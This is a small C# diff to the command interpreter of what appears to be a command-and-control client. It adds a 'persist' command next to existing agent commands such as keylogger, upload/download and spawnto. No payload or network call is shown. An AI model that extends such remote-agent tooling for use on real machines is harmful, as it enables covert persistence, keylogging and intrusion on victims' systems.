@@ -34,7 +34,7 @@ namespace Client.Interpreter
             DotNetAsmStrategy dotNetAsmStrategy, DownloadStrategy downloadStrategy, CancelDownloadStrategy cancelDownloadStrategy,
             UploadStrategy uploadStrategy, SpawnToStrategy spawnToStrategy, UpdateHostsStrategy updateHostsStrategy,
             KillStrategy killStrategy, GetUIDStrategy getUIDStrategy, SetSleepStrategy setSleepStrategy,
-            KeyloggerStrategy keyloggerStrategy, HelpStrategy helpStrategy)
+            KeyloggerStrategy keyloggerStrategy, PersistStrategy persistStrategy, HelpStrategy helpStrategy)
         {
             _strategyCache = new Dictionary<string, Func<int, string?, Task<Result<string>>>>(StringComparer.OrdinalIgnoreCase)
             {
@@ -55,6 +55,7 @@ namespace Client.Interpreter
                 { getUIDStrategy.Keyword,         (agentID, command) => getUIDStrategy.ProcessCommandAsync(agentID, command) },
                 { setSleepStrategy.Keyword,       (agentID, command) => setSleepStrategy.ProcessCommandAsync(agentID, command) },
                 { keyloggerStrategy.Keyword,      (agentID, command) => keyloggerStrategy.ProcessCommandAsync(agentID, command) },
+                { persistStrategy.Keyword,        (agentID, command) => persistStrategy.ProcessCommandAsync(agentID, command) },
                 { helpStrategy.Keyword,           (agentID, command) => helpStrategy.ProcessCommandAsync(agentID, command) },
             };
         }
